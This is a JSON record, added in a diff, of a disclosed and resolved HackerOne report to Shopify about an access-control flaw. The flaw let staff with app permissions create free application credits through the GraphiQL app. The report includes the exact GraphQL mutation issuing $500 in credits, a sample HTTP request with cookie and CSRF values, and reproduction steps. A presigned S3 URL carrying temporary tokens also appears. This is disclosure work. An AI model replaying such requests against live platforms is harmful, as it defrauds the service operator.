@@ -1,0 +1,140 @@
+{
+  "id": 1257428,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU3NDI4",
+  "url": "https://hackerone.com/reports/1257428",
+  "title": "Create free Shopify application credits.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-07-11T11:47:35.417Z",
+  "submitted_at": "2021-07-11T11:47:35.520Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jmp_35p",
+    "url": "/jmp_35p",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/giyoz9ry9im7n91le455jxg5caqp/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-09-10T21:53:32.941Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-09-10T21:53:32.846Z",
+  "team_member_agreed_on_going_public_at": "2021-09-09T18:25:31.191Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Details\nAccording to docs available at https://shopify.dev/api/admin/rest/reference/billing/applicationcredit, `appCreditCreate` is used to issue credits to merchants that can be used towards future app purchases in Shopify. I believe `appCreditCreate` mutation shouldn't be accessible to store owners and staffs who have `apps` permission. This claim is confirmed by the response returned when /admin/internal/web/graphql/core endpoint is hit as shown in appCredit_B.png. However, Shopify GraphiQL app makes the said mutation accessible (see appCredit_A.png for details). I had to confirm that the credit was really created by visiting the billing page, appCredit_C.png shows the successful creation of the $500.00 credits. Presented below is the GraphQL query which must be issued from the said app. \n\n```\n{\"operationName\":\"AppCreditCreatePayload\",\"variables\":{\"description\":\"Themes credits\",\"amount\":{\"amount\":500.00,\"currencyCode\":\"USD\"},\"test\":false},\"query\":\"mutation AppCreditCreatePayload($description:String!,$amount:MoneyInput!,$test:Boolean){\\n appCreditCreate(description:$description,amount:$amount,test:$test){\\n      appCredit{\\n      amount{\\n    amount\\n     currencyCode\\n     __typename\\n    }\\n   createdAt\\n      description\\n      id\\n      test\\n    __typename\\n    }\\n     userErrors{\\n      field\\n       message\\n       __typename\\n       }\\n     __typename\\n      }\\n   }\\n\"}\n\n```\n\nSetup\n1. Install Shopify GraphiQL app.\n2. A staff with `apps` permission.\n\nSteps to reproduce\n1. Open the app and perform any action.\n2. A POST request similar to the one below should be sent to the repeater tab.\n```\nPOST /admin/api/2021-07/graphql HTTP/2\nHost: shopify-graphiql-app.shopifycloud.com\nCookie: _shopify_graphiql_app=RJlzS4n3qPHR0fClrTa1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/89.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Csrf-Token: FS1j+3c4nU\n\n{\"query\":\"{\\n  shop {\\n    name\\n  }\\n}\\n\",\"variables\":null,\"operationName\":null}\n\n```\n3. Replace the request body with the query provided above.\n4. Alternatively, the action described above could also be performed directly from the app.\n\n## Impact\n\nUnlimited free application credits can be created.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1372640,
+      "file_name": "appCredit_B.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hvqt4bxseddue2rpr82r6aqd6ymr?response-content-disposition=attachment%3B%20filename%3D%22appCredit_B.png%22%3B%20filename%2A%3DUTF-8%27%27appCredit_B.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7WWLIBQT%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T013940Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJGMEQCIBcKE4LPoP53hW2o9EjW1Wr%2FPqll1nlAYbPemooXK1%2BQAiAFY6cTPuo7LT3Iu9AXBvaUB9wL5kFEXnFVzeqbw7NBWSq6BQj4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMR9lWme5VM%2BVncU%2B8Ko4FtJbvvJ%2FGHH%2BYc0BUZEN8YzH3WWOHAik11N1nzncmHa6Oq823GdXlhmMowsAXwYw4bLNvMfG31A2arPbrEj7TplRbFBdV4zpzsWuaj97CHfRvTUeCyZxpMmsbUyFyMjQ16i%2FKdhGYtTcv1xKFxl6FzrNNzohOOuNptYplPgrYZA8PTgLjjihadpOM6TzH5kztbJi1Zyry4Fu41OQbkJaARdBma2TcwJlRE7xJ86RZKtXdsr2PXbI3YX4OpKwgSDlLlnLxNSz4V3B3DTd%2FqgfbFWCtXY0g%2B8yla6BitjDBY5U%2BHzJPRpQrlUaEUdohGfO2Gt%2Fvimp%2BBzsu7h7CUPExsHjMWXSXgV2oq616cRPrHpMnrHIzDh3V0DSMDtKXDJvpVWt16D60Moh3rozR5%2BOc8NqcRPJzWdPynsBp1A36xBDvPEthBNGUMY%2Bzk64BdHKsL3R%2BFw2Mo25tscO8YtE3e%2Bb%2F3npZlVAW%2Bwt7TjszQoTy6DdB0I7u%2BSMsoinFXAJ4%2Fux6%2FGrT3I43SjJHUFO9uqzayBvXAIq08hiwAF%2BoETDNmoRP%2BqT5xPKRxcN3Fewl9gMbw7k3F8ZFr2XV0OvYhsmW77qqDZG78zBTyc83VhqLgLMXjCttmcHdmZp0zvhafNWUbMQRBGBtp29%2FZypf1Gj%2BX%2FnO6NOYNOkBgVgYx5Cpol8pZAhGdNp7qsFTw3fGQH5lKiwxNfVnlZC3WMVz3hQpNA46bjIeMMK2Lt2jS8RomlGT46grn23wSp8%2F4JtI2JWIYVRKuPYXJ8LNmWNvDrUy%2BxCQoHX5O5driXtWNBeyarO5EO9gppU29Plq3mTcXIhMLnhxdJLDCwbFH%2FH0DoB5KbbgHhyukwcWslAXMIDmvMYGOrIBF0eo1Gz65fkLGuT29n6sTW%2F3pGuFthiLi8utLCp2KRtYUrRo21O5V0kKpHq%2Fh9zZlPhrzh5c9Ffuvze1fmP%2FQP1hTAnC7plR5G2Z2a45C0mCZ4oRTWD7SJJkQ%2FlHaq4nZNQeA82P2JxVOqxgg%2BqjdQrbpIcmBLH2zueNO03koFZvvG9h9gXCDnlH%2FSDAbtwdwbs3gdKuAc5cB2LgFFYi6HlmneEMDJLVSm%2BzRR%2BCAwVVQA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4f203790b29cdfdc5c9ce8ea650c327ae82018ae8393fbf879c0746699bd43e9",
+      "file_size": 123030,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 131,
+  "voters": [
+    "lubak",
+    "holybugx",
+    "drsniper",
+    "alp",
+    "shreyaschavhan",
+    "rzx007x",
+    "run_win",
+    "tess",
+    "vp40",
+    "th4nu_0x0",
+    "and 121 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 37198,
+    "asset_type": "OTHER",
+    "asset_identifier": "Shopify Developed Apps",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
